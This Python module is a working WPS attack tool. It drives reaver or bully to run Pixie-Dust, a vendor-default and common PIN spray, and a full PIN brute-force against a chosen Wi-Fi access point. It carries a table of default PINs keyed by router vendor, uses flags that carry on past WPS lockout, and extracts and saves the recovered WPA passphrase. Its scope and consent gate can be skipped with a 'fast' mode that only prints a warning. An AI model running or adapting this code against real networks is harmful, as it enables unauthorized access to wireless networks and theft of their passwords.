#!/usr/bin/env python3
"""
WPS attack module: Pixie-Dust, PIN spray, and full PIN brute-force.

Backends: reaver (primary), bully (alternative).
Scope enforcement mirrors handshake.py — requires authorized BSSID + consent
unless fast=True is set (lab/CTF mode — prints red warning instead).

Attack modes
────────────
[1] Pixie-Dust     reaver -K 1 / bully --pixie  — offline nonce recovery,
                   cracks vulnerable APs in <30 s.
[2] Vendor PIN Spray  OUI-matched defaults + 30 most common PINs.
[3] Full Brute-Force  all ~11 000 valid WPS PINs (reaver loop).
[4] Wash Scan      passive WPS beacon sniffer — no frames sent, no scope needed.
"""
from __future__ import annotations

import logging
import os
import re
import shutil
import subprocess
import threading
import time
from datetime import datetime
from typing import Optional

from modules.banner import C, info, success, warn, error, found, print_section
from modules.exceptions import DependencyError, ScopeError
from modules.scope import ScopeManager

logger = logging.getLogger(__name__)

RESULTS_DIR = "results"
os.makedirs(RESULTS_DIR, exist_ok=True)

# ─── Known WPS PINs by OUI prefix (6 hex chars, no colons, upper) ────────────
# Sourced from public vulnerability disclosures and router default databases.
VENDOR_PINS: dict[str, list[str]] = {
    "00265A": ["12345670"],                      # Belkin
    "94103E": ["12345670"],                      # Belkin
    "001882": ["12345670"],                      # Belkin
    "C83A35": ["12345670"],                      # Tenda
    "F8D111": ["00000000", "12345670"],          # Tenda
    "1C3950": ["12345670"],                      # TP-Link
    "50C7BF": ["12345670"],                      # TP-Link
    "D8EB97": ["12345670"],                      # TP-Link
    "EC172F": ["12345670"],                      # TP-Link
    "6045CB": ["12345670"],                      # TP-Link
    "001CF0": ["00000000"],                      # D-Link
    "144D67": ["00000000"],                      # D-Link
    "1CAFF7": ["00000000"],                      # D-Link
    "001422": ["12345670"],                      # Netgear
    "20E52A": ["12345670"],                      # Netgear
    "C0FF28": ["12345670"],                      # Netgear
    "B0487A": ["12345670"],                      # Huawei
    "48AD08": ["12345670"],                      # Huawei
    "74DADA": ["12345670"],                      # ZyXEL
    "001217": ["12345670"],                      # Linksys/Cisco
    "002275": ["12345670"],                      # Linksys/Cisco
    "001D7E": ["12345670"],                      # Cisco
    "A8B1D4": ["12345670"],                      # Asus
    "04D4C4": ["12345670"],                      # Asus
    "706F81": ["12345670"],                      # Buffalo
    "0018E7": ["12345670"],                      # Motorola
}

# Top 30 most common WPS PINs across all vendors (public research)
COMMON_PINS = [
    "12345670", "00000000", "11111111", "22222222", "33333333",
    "44444444", "55555555", "66666666", "77777777", "88888888",
    "99999999", "12345678", "87654321", "11223344", "00000001",
    "10000000", "55550000", "12340000", "00001234", "01234567",
    "20172017", "20182018", "20192019", "20202020", "20212021",
    "20222022", "20232023", "12341234", "11112222", "99998888",
]


###############################################################################
# WPS capability detection  (passive, read-only — no scope needed)
###############################################################################

def detect_wps_capability(
    interface: str,
    bssid: str,
    channel: int,
    timeout: int = 6,
) -> dict:
    """
    Run a short wash scan on *interface* locked to *channel* and check if
    *bssid* advertises WPS in its beacons.

    Returns:
        {
            "enabled": bool,   # True if WPS beacon seen
            "locked":  bool,   # True if WPS AP-Lock bit set
            "version": str,    # WPS version string e.g. "2.0" (or "")
        }
    """
    result = {"enabled": False, "locked": False, "version": ""}

    if not shutil.which("wash"):
        logger.debug("wash not found — WPS detection skipped")
        return result

    proc = subprocess.Popen(
        ["wash", "-i", interface, "-c", str(channel), "-C"],
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
    )

    output_lines: list[str] = []

    def _collect() -> None:
        for line in proc.stdout:
            output_lines.append(line.rstrip())

    reader = threading.Thread(target=_collect, daemon=True)
    reader.start()
    time.sleep(timeout)
    proc.terminate()
    proc.wait()
    reader.join(timeout=2)

    target_oui = bssid.upper()
    for line in output_lines:
        if target_oui in line.upper():
            result["enabled"] = True
            # Parse WPS version (e.g. "2.0")
            m = re.search(r"\b([12]\.\d)\b", line)
            if m:
                result["version"] = m.group(1)
            # Parse lock status
            if re.search(r"\bYes\b", line, re.IGNORECASE):
                result["locked"] = True
            break

    logger.debug(
        "WPS probe: bssid=%s enabled=%s locked=%s version=%s",
        bssid, result["enabled"], result["locked"], result["version"],
    )
    return result


###############################################################################
# Public entry point
###############################################################################

def wps_menu(
    interface: str,
    target: Optional[dict],
    scope: Optional[ScopeManager],
    fast: bool = False,
) -> None:
    """
    Interactive WPS attack menu.  Call with fast=True to bypass scope/consent
    in authorized lab environments (prints red warning instead).
    """
    print_section("WPS Attack Module")

    # ── Resolve target ────────────────────────────────────────────────────────
    if not target:
        bssid = input(f"  {C.YELLOW}Target BSSID: {C.RESET}").strip().upper()
        if not re.match(r"^([0-9A-F]{2}:){5}[0-9A-F]{2}$", bssid):
            error("Invalid BSSID format.")
            return
        try:
            channel = int(input(f"  {C.YELLOW}Channel: {C.RESET}").strip())
        except (ValueError, KeyboardInterrupt):
            error("Invalid channel.")
            return
        ssid = input(f"  {C.YELLOW}SSID (optional): {C.RESET}").strip() or bssid
        target = {"bssid": bssid, "ssid": ssid, "channel": channel, "privacy": "WPA2"}

    bssid   = target["bssid"].upper()
    channel = int(target.get("channel", 6))
    ssid    = target.get("ssid") or target.get("essid") or bssid

    info(f"Target : {ssid}  [{bssid}]  CH{channel}")
    _check_wps_deps()

    print(f"""
  {C.WHITE}WPS Attack Mode:{C.RESET}
  {C.GREEN}[1]{C.RESET} Pixie-Dust       {C.DIM}– offline nonce attack, cracks in seconds if vulnerable{C.RESET}
  {C.GREEN}[2]{C.RESET} Vendor PIN Spray {C.DIM}– OUI-matched defaults + {len(COMMON_PINS)} common PINs{C.RESET}
  {C.GREEN}[3]{C.RESET} Full PIN Brute   {C.DIM}– all ~11 000 valid WPS PINs via reaver{C.RESET}
  {C.CYAN}[4]{C.RESET} Wash Scan        {C.DIM}– detect WPS-enabled APs (read-only, no scope needed){C.RESET}
  {C.RED}[0]{C.RESET} Back
""")

    choice = input(f"  {C.YELLOW}Mode: {C.RESET}").strip()

    if choice == "0":
        return
    if choice == "4":
        _wash_scan(interface)
        return
    if choice not in ("1", "2", "3"):
        error(f"Unknown option: {choice!r}")
        return

    # ── Authorization gate ────────────────────────────────────────────────────
    if fast:
        _fast_mode_warning(bssid, ssid)
    else:
        try:
            _wps_scope_and_consent(scope, bssid, ssid, choice)
        except ScopeError as e:
            error(f"Scope violation: {e}")
            return
        except SystemExit:
            return

    # ── Backend selection ─────────────────────────────────────────────────────
    try:
        backend = _select_backend()
    except DependencyError as e:
        error(str(e))
        return

    if choice == "1":
        _pixiedust_attack(interface, bssid, channel, ssid, backend)
    elif choice == "2":
        _pin_spray_attack(interface, bssid, channel, ssid, backend)
    elif choice == "3":
        _full_bruteforce(interface, bssid, channel, ssid, backend)


###############################################################################
# Scope + consent  (mirrors handshake.py pattern exactly)
###############################################################################

def _fast_mode_warning(bssid: str, ssid: str) -> None:
    from rich.console import Console
    from rich import box
    from rich.panel import Panel
    Console().print(Panel(
        f"[bold red]⚡ FAST MODE — SCOPE & CONSENT BYPASSED ⚡[/]\n\n"
        f"Target: [bold]{ssid}[/]  [{bssid}]\n\n"
        "[bold yellow]This mode is for AUTHORIZED LAB / CTF environments ONLY.\n"
        "Using this against networks you do not own is ILLEGAL.[/]",
        title="[bold red]Fast Mode Active[/]",
        box=box.DOUBLE,
        border_style="red",
    ))
    logger.warning("WPS fast mode: bssid=%s ssid=%s scope_bypassed=True", bssid, ssid)


def _wps_scope_and_consent(
    scope: Optional[ScopeManager],
    bssid: str,
    ssid: str,
    mode: str,
) -> None:
    from rich.console import Console
    from rich import box
    from rich.panel import Panel
    import sys

    if scope is not None:
        scope.require_authorized(bssid, "WPS attack")

    op_names = {
        "1": "WPS Pixie-Dust",
        "2": "WPS PIN Spray",
        "3": "WPS PIN Brute-Force",
    }
    operation = op_names.get(mode, "WPS Attack")
    con = Console()

    con.print()
    con.print(Panel(
        f"[bold red]⚠  FRAME INJECTION WARNING  ⚠[/]\n\n"
        f"You are about to perform: [bold]{operation}[/]\n\n"
        f"  [bold]BSSID:[/] {bssid}\n"
        f"  [bold]SSID: [/] {ssid}\n\n"
        "WPS attacks send probe/auth frames to the target AP.\n"
        "[bold yellow]Only proceed if you have WRITTEN authorization from the owner.[/]\n\n"
        "To confirm, type the target BSSID exactly below:",
        title="[bold red]WPS Authorization Required[/]",
        box=box.DOUBLE,
        border_style="red",
    ))

    sys.stdout.write(f"\n  Type BSSID to confirm: ")
    sys.stdout.flush()
    try:
        entered = input("").strip().upper()
    except KeyboardInterrupt:
        con.print("[red]Aborted.[/]")
        raise SystemExit(0)

    if entered != bssid:
        con.print(f"[red]BSSID mismatch (entered {entered!r}, expected {bssid!r}). Aborting.[/]")
        raise SystemExit(1)

    confirm = input("  Proceed? [y/N]: ").strip().lower()
    if confirm != "y":
        con.print("[red]Aborted.[/]")
        raise SystemExit(0)

    try:
        username = os.getlogin()
    except OSError:
        username = os.environ.get("USER", "unknown")

    logger.info(
        "CONSENT_GRANTED user=%s bssid=%s operation=%s ts=%s",
        username, bssid, operation, datetime.now().isoformat(),
    )
    con.print(f"[green]✓ Consent logged for {bssid}[/]")


###############################################################################
# Dependency / backend helpers
###############################################################################

def _check_wps_deps() -> None:
    if not shutil.which("reaver") and not shutil.which("bully"):
        warn("Neither reaver nor bully found.")
        warn("  Install: sudo apt install reaver  or  sudo apt install bully")
    if not shutil.which("wash"):
        warn("wash not found — WPS scan (mode 4) unavailable. Install: sudo apt install wash")


def _select_backend() -> str:
    has_reaver = shutil.which("reaver") is not None
    has_bully  = shutil.which("bully")  is not None

    if not has_reaver and not has_bully:
        raise DependencyError("Neither reaver nor bully found.", binary="reaver")

    if has_reaver and has_bully:
        print(f"""
  {C.WHITE}Backend:{C.RESET}
  {C.GREEN}[1]{C.RESET} reaver  {C.DIM}(recommended — better Pixie-Dust + state resume){C.RESET}
  {C.GREEN}[2]{C.RESET} bully   {C.DIM}(faster on some APs, better WPS-lock handling){C.RESET}
""")
        c = input(f"  {C.YELLOW}Backend [1]: {C.RESET}").strip()
        return "bully" if c == "2" else "reaver"

    chosen = "reaver" if has_reaver else "bully"
    info(f"Using {chosen}.")
    return chosen


###############################################################################
# Attack 1 — Pixie-Dust
###############################################################################

def _pixiedust_attack(
    interface: str, bssid: str, channel: int, ssid: str, backend: str
) -> None:
    print_section(f"WPS Pixie-Dust  →  {ssid} [{bssid}]")
    info("Extracting WPS nonces from M1/M2 exchange...")
    info("Typical runtime on vulnerable AP: 5 – 30 seconds")
    info(f"{C.DIM}(Ctrl+C to abort){C.RESET}")

    if backend == "reaver":
        cmd = [
            "reaver",
            "-i", interface, "-b", bssid, "-c", str(channel),
            "-K", "1",          # Pixie-Dust
            "-vv",
            "-N",               # skip associated check
            "--no-nacks",
            "-T", "5",          # seconds per WPS transaction
        ]
    else:
        # bully with --pixie (supported in Bully ≥ 1.0 and most distro packages)
        cmd = [
            "bully", interface,
            "-b", bssid, "-c", str(channel),
            "--pixie",
            "-v", "3",
        ]

    result = _run_wps(cmd, bssid, ssid, timeout=120)
    _handle_result(result, bssid, ssid, "Pixie-Dust")


###############################################################################
# Attack 2 — Vendor PIN Spray
###############################################################################

def _pin_spray_attack(
    interface: str, bssid: str, channel: int, ssid: str, backend: str
) -> None:
    print_section(f"WPS PIN Spray  →  {ssid} [{bssid}]")

    oui        = bssid.replace(":", "")[:6].upper()
    vendor_hit = VENDOR_PINS.get(oui, [])
    pin_list: list[str] = list(vendor_hit)

    if vendor_hit:
        info(f"OUI {oui} matched — {len(vendor_hit)} vendor-specific PIN(s) queued first")
    else:
        info(f"OUI {oui} not in vendor database — using common PIN list only")

    for p in COMMON_PINS:
        if p not in pin_list:
            pin_list.append(p)

    # Spray tries all listed PINs — some APs don't enforce the WPS checksum,
    # so we don't filter here (reaver -p sends the exact PIN we specify).
    info(f"PIN queue: {len(pin_list)} entries")
    print(f"  {C.DIM}Pins: {', '.join(pin_list[:8])}{'...' if len(pin_list) > 8 else ''}{C.RESET}\n")

    start = time.time()
    for i, pin in enumerate(pin_list, 1):
        elapsed = time.time() - start
        print(
            f"  \r{C.CYAN}[{i}/{len(pin_list)}]{C.RESET} Trying {C.BOLD}{pin}{C.RESET}"
            f"  ({elapsed:.0f}s)",
            end="", flush=True,
        )
        logger.debug("WPS spray: bssid=%s pin=%s attempt=%d", bssid, pin, i)

        if backend == "reaver":
            cmd = [
                "reaver",
                "-i", interface, "-b", bssid, "-c", str(channel),
                "-p", pin,
                "-vv", "-N", "--no-nacks", "-T", "10",
            ]
        else:
            cmd = [
                "bully", interface,
                "-b", bssid, "-c", str(channel),
                "-p", pin, "-v", "3",
            ]

        result = _run_wps(cmd, bssid, ssid, timeout=40, single_pin=True)

        if result.get("psk"):
            print()
            _handle_result(result, bssid, ssid, f"PIN Spray (pin={pin})")
            return
        if result.get("locked"):
            print()
            warn(f"AP WPS locked after PIN {pin}. Wait for lockout to expire (5–60 min).")
            return

    print()
    elapsed = time.time() - start
    error(f"No match in PIN spray ({len(pin_list)} PINs, {elapsed:.0f}s).")
    info("Next steps: try Pixie-Dust (mode 1) or Full Brute-Force (mode 3).")


###############################################################################
# Attack 3 — Full PIN Brute-Force
###############################################################################

def _full_bruteforce(
    interface: str, bssid: str, channel: int, ssid: str, backend: str
) -> None:
    print_section(f"WPS Full PIN Brute-Force  →  {ssid} [{bssid}]")
    warn("Full brute-force can take 4 – 8 hours and may trigger WPS lockout.")
    warn("Modern APs often rate-limit or permanently lock after 3 – 5 failures.")

    try:
        delay = int(
            input(f"  {C.YELLOW}Delay between attempts in seconds [2]: {C.RESET}").strip() or "2"
        )
    except (ValueError, KeyboardInterrupt):
        delay = 2

    try:
        lock_delay = int(
            input(f"  {C.YELLOW}Wait when locked (seconds) [60]: {C.RESET}").strip() or "60"
        )
    except (ValueError, KeyboardInterrupt):
        lock_delay = 60

    if backend == "reaver":
        cmd = [
            "reaver",
            "-i", interface, "-b", bssid, "-c", str(channel),
            "-vv", "-N", "--no-nacks",
            "-d", str(delay),       # delay between pins
            "-r", "3:60",           # 3 attempts per 60 s to avoid AP lock
            "-L",                   # continue despite WPS lock signal
            "-x", str(lock_delay),  # wait lock_delay s when locked
        ]
        info(f"State saves to /etc/reaver/{bssid.replace(':', '').lower()}.wpc — resumable.")
    else:
        cmd = [
            "bully", interface,
            "-b", bssid, "-c", str(channel),
            "-v", "3",
            "-d", str(delay),
            "-l", str(lock_delay),
        ]

    info("Starting full brute-force (Ctrl+C to stop — reaver resumes from saved state).")
    result = _run_wps(cmd, bssid, ssid, timeout=None)
    _handle_result(result, bssid, ssid, "Full PIN Brute-Force")


###############################################################################
# Wash scan  (read-only, no scope needed)
###############################################################################

def _wash_scan(interface: str, duration: int = 25) -> None:
    if not shutil.which("wash"):
        error("wash not found. Install: sudo apt install wash")
        return

    print_section("WPS AP Discovery  (wash)")
    info(f"Scanning for WPS-enabled APs on {interface} for {duration}s...")
    info(f"{C.DIM}(no frames sent — passive beacon collection){C.RESET}")

    output_lines: list[str] = []

    proc = subprocess.Popen(
        ["wash", "-i", interface, "-C"],   # -C: ignore FCS errors
        stdout=subprocess.PIPE,
        stderr=subprocess.DEVNULL,
        text=True,
    )

    def _collect() -> None:
        for line in proc.stdout:
            output_lines.append(line.rstrip())

    reader = threading.Thread(target=_collect, daemon=True)
    reader.start()

    try:
        for remaining in range(duration, 0, -1):
            print(f"\r  {C.CYAN}Scanning... {remaining}s remaining{C.RESET}", end="", flush=True)
            time.sleep(1)
    except KeyboardInterrupt:
        pass
    finally:
        proc.terminate()
        proc.wait()
        reader.join(timeout=2)

    print()
    print(f"\n  {C.BOLD}WPS-Enabled APs:{C.RESET}")
    print(f"  {'─' * 72}")

    ap_count  = 0
    locked_ap = 0
    for line in output_lines:
        if re.match(r"^\s*([0-9A-Fa-f]{2}:){5}[0-9A-Fa-f]{2}", line):
            ap_count += 1
            is_locked = bool(re.search(r"\bYes\b", line, re.IGNORECASE))
            if is_locked:
                locked_ap += 1
                print(f"  {C.RED}{line}  [LOCKED]{C.RESET}")
            else:
                print(f"  {C.GREEN}{line}{C.RESET}")
        elif re.match(r"^\s*(BSSID|─)", line):
            print(f"  {C.DIM}{line}{C.RESET}")

    print(f"  {'─' * 72}")
    if ap_count == 0:
        warn("No WPS-enabled APs found in this scan window.")
        info("Try longer duration or ensure you are in monitor mode on the right channel.")
    else:
        info(f"{ap_count} WPS-enabled AP(s) found  ({locked_ap} locked).")
        if locked_ap:
            warn("Locked APs reject PIN attacks — try Pixie-Dust or wait for lock to expire.")


###############################################################################
# Core subprocess runner
###############################################################################

def _run_wps(
    cmd: list[str],
    bssid: str,
    ssid: str,
    timeout: Optional[int] = 300,
    single_pin: bool = False,
) -> dict:
    """
    Stream reaver/bully output and parse for WPS PIN + WPA PSK.

    Returns a dict:
      pin (str|None), psk (str|None), locked (bool), timeout (bool), error (str|None)
    """
    result: dict = {
        "pin": None, "psk": None,
        "locked": False, "timeout": False, "error": None,
        "_tried_first": False,
    }

    try:
        proc = subprocess.Popen(
            cmd,
            stdout=subprocess.PIPE,
            stderr=subprocess.STDOUT,
            text=True,
            bufsize=1,
        )
    except FileNotFoundError as exc:
        result["error"] = str(exc)
        return result

    deadline = time.monotonic() + timeout if timeout else None

    try:
        for raw in proc.stdout:
            line = raw.rstrip()
            if line:
                _print_wps_line(line)

            # ── Key extraction ────────────────────────────────────────────────
            if m := re.search(r"WPS\s+PIN\s*:\s*['\"]?(\d{4,8})['\"]?", line, re.IGNORECASE):
                result["pin"] = m.group(1)
            if m := re.search(r"WPA\s+PSK\s*:\s*['\"](.+?)['\"]", line, re.IGNORECASE):
                result["psk"] = m.group(1)
            # bully format
            if m := re.search(r"PSK\s+is\s*:\s*['\"](.+?)['\"]", line, re.IGNORECASE):
                result["psk"] = m.group(1)
            if m := re.search(r"WPS\s+pin\s+is\s*:\s*['\"]?(\d{4,8})['\"]?", line, re.IGNORECASE):
                result["pin"] = m.group(1)

            # ── Lock / rate-limit detection ───────────────────────────────────
            if re.search(
                r"(WPS\s+transaction\s+failed|WPS\s+lock|ap\s+rate.limit|WARNING.*lock)",
                line, re.IGNORECASE,
            ):
                result["locked"] = True
                if single_pin:
                    proc.terminate()
                    break

            if result["psk"]:
                proc.terminate()
                break

            # ── Single-pin early exit ─────────────────────────────────────────
            if single_pin and re.search(r"Trying\s+pin", line, re.IGNORECASE):
                if result["_tried_first"]:
                    proc.terminate()
                    break
                result["_tried_first"] = True

            # ── Timeout check ─────────────────────────────────────────────────
            if deadline and time.monotonic() > deadline:
                result["timeout"] = True
                proc.terminate()
                break

    except KeyboardInterrupt:
        proc.terminate()
        warn("\nWPS attack interrupted by user.")
    finally:
        try:
            proc.wait(timeout=5)
        except subprocess.TimeoutExpired:
            proc.kill()

    result.pop("_tried_first", None)
    return result


def _print_wps_line(line: str) -> None:
    lu = line.upper()
    if "WPA PSK" in lu or "PSK IS" in lu:
        print(f"  {C.BOLD}{C.GREEN}{line}{C.RESET}")
    elif "WPS PIN" in lu or "PIN IS" in lu:
        print(f"  {C.BOLD}{C.CYAN}{line}{C.RESET}")
    elif "KEY CRACKED" in lu or "KEY FOUND" in lu:
        print(f"  {C.BOLD}{C.GREEN}{line}{C.RESET}")
    elif re.search(r"(LOCKED|RATE.LIMIT|FAILED|ERROR)", lu):
        print(f"  {C.RED}{line}{C.RESET}")
    elif "TRYING PIN" in lu or "SENDING M" in lu:
        print(f"  \r{C.DIM}{line}{C.RESET}", end="", flush=True)
    elif line.startswith("[+]"):
        print(f"  {C.GREEN}{line}{C.RESET}")
    elif line.startswith("[!]"):
        print(f"  {C.YELLOW}{line}{C.RESET}")
    elif line.startswith("[-]"):
        print(f"  {C.RED}{line}{C.RESET}")


###############################################################################
# Result handler + persistence
###############################################################################

def _handle_result(result: dict, bssid: str, ssid: str, mode: str) -> None:
    psk = result.get("psk")
    pin = result.get("pin")

    if psk:
        found(f"WPA PSK recovered  →  {psk}")
        if pin:
            found(f"WPS PIN            →  {pin}")
        _save_wps_result(bssid, ssid, pin, psk, mode)
    elif pin:
        success(f"WPS PIN found: {pin}  (run again to extract PSK with -p {pin})")
        _save_wps_result(bssid, ssid, pin, None, mode)
    elif result.get("locked"):
        warn("AP WPS is locked — PIN attacks won't succeed until lock expires (5 – 60 min).")
        info("Pixie-Dust (mode 1) may still work on locked APs if nonces were captured.")
    elif result.get("timeout"):
        warn("Attack timed out — AP may not be WPS-vulnerable or WPS is disabled.")
        info("Confirm WPS is enabled first: use wash scan (mode 4).")
    elif result.get("error"):
        error(f"Subprocess error: {result['error']}")
    else:
        error("WPS attack did not recover credentials.")
        info("Suggestions: try Pixie-Dust, switch backend, or verify WPS is enabled (wash).")


def _valid_wps_pin(pin: str) -> bool:
    """Validate WPS PIN: must be 4 or 8 digits; 8-digit PINs must pass checksum."""
    if not re.match(r"^\d{4}$|^\d{8}$", pin):
        return False
    if len(pin) == 8:
        d = [int(c) for c in pin]
        total = 3 * (d[0] + d[2] + d[4] + d[6]) + (d[1] + d[3] + d[5])
        return d[7] == (10 - total % 10) % 10
    return True


def _save_wps_result(
    bssid: str, ssid: str,
    pin: Optional[str], psk: Optional[str],
    mode: str,
) -> None:
    stamp = datetime.now().strftime("%Y%m%d_%H%M%S")
    path  = os.path.join(RESULTS_DIR, f"wps_{stamp}.txt")
    with open(path, "w") as f:
        f.write(f"Timestamp : {datetime.now()}\n")
        f.write(f"Mode      : {mode}\n")
        f.write(f"BSSID     : {bssid}\n")
        f.write(f"SSID      : {ssid}\n")
        if pin:
            f.write(f"WPS PIN   : {pin}\n")
        if psk:
            f.write(f"WPA PSK   : {psk}\n")
    success(f"Result saved → {path}")
    logger.info("WPS result: %s bssid=%s pin=%s psk_found=%s", path, bssid, pin, bool(psk))
